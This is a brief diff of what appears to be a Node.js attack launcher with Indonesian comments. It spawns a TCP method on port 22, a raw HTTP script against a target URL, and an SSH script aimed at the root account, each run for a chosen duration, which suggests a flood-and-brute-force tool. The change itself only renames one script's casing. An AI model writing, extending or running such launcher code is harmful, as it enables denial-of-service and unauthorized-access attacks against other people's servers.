@@ -50,7 +50,7 @@ async function main() {
 
         // Menjalankan command dengan spawn
         runCommand('./methods/tcp', [ip, "22", time]);
-        runCommand('node', ['./methods/http-raw.js', targetUrl, time]);
+        runCommand('node', ['./methods/HTTP-RAW.js', targetUrl, time]);
         runCommand('node', ['./methods/StarsXSSH.js', ip, '22', 'root', time]);
     } catch (error) {
         console.error('Error:', error);
